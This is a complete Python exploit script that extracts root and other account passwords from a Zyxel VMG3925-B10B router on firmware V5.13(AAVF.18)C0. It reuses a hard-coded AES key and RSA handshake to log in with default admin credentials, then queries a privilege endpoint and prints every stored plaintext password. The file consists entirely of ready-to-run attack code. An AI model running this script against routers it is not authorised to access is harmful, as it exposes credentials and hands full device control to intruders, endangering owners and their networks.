import argparse
import json
from base64 import b64decode
from base64 import b64encode
from typing import Any

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5


DESCRIPTION = ('Root password extractor '
               'for Zyxel VMG3925-B10B '
               'with V5.13(AAVF.18)C0 firmware.')

HTTP_TIMEOUT: int = 15

IV_STR: str = 'QIihlG0/jNa/RH8l7qH2eUYnEi+FCgxbeaiBdQ+ZueY='
IV_B64: bytes = b64decode(IV_STR)

HEADERS_TEMPLATE: dict[str, str] = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'X-Requested-With': 'XMLHttpRequest',
    'If-Modified-Since': '0'
}


def encrypt(data: str, rsa_key: str) -> str:
    cipher = AES.new(IV_B64, AES.MODE_CBC, IV_B64[:AES.block_size])
    padded = pad(data.encode('utf-8'), AES.block_size)
    encrypted = cipher.encrypt(padded)
    encrypted_b64 = b64encode(encrypted).decode()

    return f'{{"content":"{encrypted_b64}","key":"{rsa_key}","iv":"{IV_STR}"}}'


def decrypt(data: bytes) -> bytes:
    data_json = json.loads(data)
    try:
        content: str = data_json['content']
        iv: str = data_json['iv']
    except KeyError as e:
        print(f'data_json: {data_json}')
        raise e

    cipher = AES.new(IV_B64, AES.MODE_CBC, b64decode(iv)[:AES.block_size])
    decrypted = cipher.decrypt(b64decode(content))
    unpadded = unpad(decrypted, AES.block_size)

    return unpadded


def get_rsa_key(host: str) -> str:
    headers = HEADERS_TEMPLATE
    headers['Host'] = host
    headers['Cookie'] = 'Session='

    response_json = requests.get(f'http://{host}/getRSAPublickKey',
                                 headers=headers,
                                 timeout=HTTP_TIMEOUT).json()

    cipher = PKCS1_v1_5.new(RSA.importKey(response_json['RSAPublicKey']))
    encrypted = cipher.encrypt(IV_STR.encode())

    return b64encode(encrypted).decode()


def user_login(host: str,
               username: str,
               password: str,
               key: str
               ) -> Any:
    password_b64: str = b64encode(password.encode()).decode()
    request = (
        '{'
        f'"Input_Account":"{username}",'
        f'"Input_Passwd":"{password_b64}",'
        '"RememberPassword":0,'
        '"SHA512_password":""'
        '}'
    )

    headers = HEADERS_TEMPLATE
    headers['Host'] = host
    headers['Cookie'] = 'Session='

    req = requests.post(f'http://{host}/UserLogin',
                        data=encrypt(request, key),
                        headers=headers,
                        timeout=HTTP_TIMEOUT)

    creds = json.loads(decrypt(req.content))
    creds['session'] = req.headers['Set-Cookie'].split(';', maxsplit=1)[0]

    return creds


def extract_passwords(host: str,
                      username: str,
                      password: str,
                      key: str
                      ) -> None:
    creds = user_login(host, username, password, key)

    headers = HEADERS_TEMPLATE
    headers['Host'] = host
    headers['Cookie'] = creds['session']

    req = requests.get(f'http://{host}/cgi-bin/DAL?oid=login_privilege',
                       headers=headers,
                       timeout=HTTP_TIMEOUT)

    login_info = json.loads(decrypt(req.content))
    flag = False
    for login_obj in login_info['Object']:
        if not isinstance(login_obj, dict):
            continue
        login = login_obj.get('Username')
        if login is None:
            continue
        secret = login_obj.get('Password')
        if not secret:
            continue
        print(f'Password for user "{login}" is "{secret}"')
        flag = True

    if not flag:
        print('It looks like this is the first boot of the router '
              'after resetting to factory default. '
              'Please reboot the router and try again.')


def parse_args() -> argparse.Namespace:
    formatter = argparse.ArgumentDefaultsHelpFormatter
    parser = argparse.ArgumentParser(description=DESCRIPTION,
                                     formatter_class=formatter)
    parser.add_argument(
        '-d',
        '--destination',
        help='IP address and port',
        default='192.168.1.1:80'
    )
    parser.add_argument(
        '-u',
        '--username',
        help='Username',
        default='admin'
    )
    parser.add_argument(
        '-p',
        '--password',
        help='Password',
        default='1234'
    )
    args = parser.parse_args()

    return args


def main() -> None:
    args = parse_args()

    extract_passwords(args.destination,
                      args.username,
                      args.password,
                      get_rsa_key(args.destination))


if __name__ == '__main__':
    main()
